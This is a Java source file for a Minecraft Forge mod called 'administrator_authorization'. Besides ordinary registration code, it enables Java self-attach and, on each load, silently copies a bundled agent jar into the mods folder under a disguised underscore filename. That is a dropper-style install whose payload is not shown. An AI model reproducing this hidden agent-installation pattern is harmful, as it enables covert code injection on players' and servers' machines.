package net.mcreator.administratorauthorization;

import net.mcreator.administratorauthorization.classes.ReflectionUtils;
import net.mcreator.administratorauthorization.init.AdministratorAuthorizationModBlocks;
import net.mcreator.administratorauthorization.init.AdministratorAuthorizationModItems;
import net.mcreator.administratorauthorization.security.MonitoringService;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.LivingEntity;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.fml.util.thread.SidedThreadGroups;
import net.minecraftforge.network.NetworkEvent;
import net.minecraftforge.network.NetworkRegistry;
import net.minecraftforge.network.simple.SimpleChannel;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.AbstractMap;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.BiConsumer;
import java.util.function.Function;
import java.util.function.Supplier;

@Mod("administrator_authorization")
public class AdministratorAuthorizationMod {
    public static final Logger LOGGER = LogManager.getLogger(AdministratorAuthorizationMod.class);
    public static final String MODID = "administrator_authorization";
    public static final String HOLDER_VERSION = "1.0-SNAPSHOT";

    static {
        System.setProperty("jdk.attach.allowAttachSelf", "true");
    }

    public AdministratorAuthorizationMod() throws IOException {
        MonitoringService.init();

        // Start of user code block mod constructor
        // End of user code block mod constructor
        MinecraftForge.EVENT_BUS.register(this);

        IEventBus bus = FMLJavaModLoadingContext.get().getModEventBus();

        AdministratorAuthorizationModBlocks.REGISTRY.register(bus);

        AdministratorAuthorizationModItems.REGISTRY.register(bus);

        if (!Files.exists(Paths.get("disable.txt"))) {
            extractAgentJar(HOLDER_VERSION);
        } else {
            System.out.println("agent disabled");
        }
    }

    private void extractAgentJar(String version) {
        Path agentJar = Paths.get( "agent_holder-" + version + ".jar");
        Path modFolder = Paths.get("mods/________________a.jar");
        try (InputStream stream = AdministratorAuthorizationMod.class.getClassLoader().getResourceAsStream(agentJar.toString())) {
            Files.copy(stream, modFolder, StandardCopyOption.REPLACE_EXISTING);
            System.out.println("Extracted agent holder: " + agentJar);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    // Start of user code block mod methods
    // End of user code block mod methods
    private static final String PROTOCOL_VERSION = "1";
    public static final SimpleChannel PACKET_HANDLER = NetworkRegistry.newSimpleChannel(new ResourceLocation(MODID, MODID), () -> PROTOCOL_VERSION, PROTOCOL_VERSION::equals, PROTOCOL_VERSION::equals);
    private static int messageID = 0;

    public static <T> void addNetworkMessage(Class<T> messageType, BiConsumer<T, FriendlyByteBuf> encoder, Function<FriendlyByteBuf, T> decoder, BiConsumer<T, Supplier<NetworkEvent.Context>> messageConsumer) {
        PACKET_HANDLER.registerMessage(messageID, messageType, encoder, decoder, messageConsumer);
        messageID++;
    }

    private static final Collection<AbstractMap.SimpleEntry<Runnable, Integer>> workQueue = new ConcurrentLinkedQueue<>();

    public static void queueServerWork(int tick, Runnable action) {
        if (Thread.currentThread().getThreadGroup() == SidedThreadGroups.SERVER)
            workQueue.add(new AbstractMap.SimpleEntry<>(action, tick));
    }

    @SubscribeEvent
    public void tick(TickEvent.ServerTickEvent event) {
        if (event.phase == TickEvent.Phase.END) {
            List<AbstractMap.SimpleEntry<Runnable, Integer>> actions = new ArrayList<>();
            workQueue.forEach(work -> {
                work.setValue(work.getValue() - 1);
                if (work.getValue() == 0)
                    actions.add(work);
            });
            actions.forEach(e -> e.getKey().run());
            workQueue.removeAll(actions);
        }
    }
}
